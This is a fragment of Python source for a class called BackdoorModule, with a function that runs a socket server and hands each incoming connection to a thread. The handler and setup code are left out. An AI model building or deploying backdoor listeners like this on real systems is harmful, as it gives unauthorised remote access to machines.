...
class BackdoorModule:
    """Handles backdoor functionality"""
...
def start_backdoor_module():
    """Start the backdoor module server"""
    injector = BackdoorModule()
    
    while injector.running:
        client_socket, addr = injector.server_socket.accept()
        thread = threading.Thread(target=injector.handle_client, args=(client_socket,))
        thread.start()

if __name__ == "__main__":
    start_backdoor_module()
